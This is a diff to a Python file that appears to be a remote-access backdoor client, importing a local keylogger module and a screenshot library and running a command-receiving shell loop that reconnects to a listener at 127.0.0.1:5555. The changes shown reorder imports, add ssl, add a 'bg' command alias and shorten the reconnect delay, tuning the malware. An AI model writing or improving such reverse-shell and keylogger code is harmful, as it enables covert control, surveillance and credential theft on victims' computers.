@@ -1,22 +1,23 @@
-import socket
+# Standard library imports
 import json
-import subprocess
-import time
 import os
-import threading
 import shutil
+import socket
+import ssl
+import subprocess
 import sys
+import threading
+import time
 from sys import platform
 
-# External dependencies
-from mss import mss
+# Related third party imports
 import requests
+from mss import mss
 
-# Local dependencies
+# Local application/library specific imports
 import keylogger
 # from mss import mss # mss v6.1.0
 # import requests # v2.28.0
-
 
 
 def reliable_send(data):
@@ -106,7 +107,7 @@ def shell():
         command = reliable_recv()
         if command == 'quit':
             break
-        elif command == 'background':  # BEGIN
+        elif command == 'background' or command == 'bg':  # BEGIN
             pass
         elif command == 'help':  # ideally to be removed
             pass
@@ -168,7 +169,7 @@ def shell():
 
 def connection():
     while True:
-        time.sleep(5)
+        time.sleep(1)
         try:
             s.connect(('127.0.0.1', 5555))
             # if platform == 'win32':       #TO BE DONE
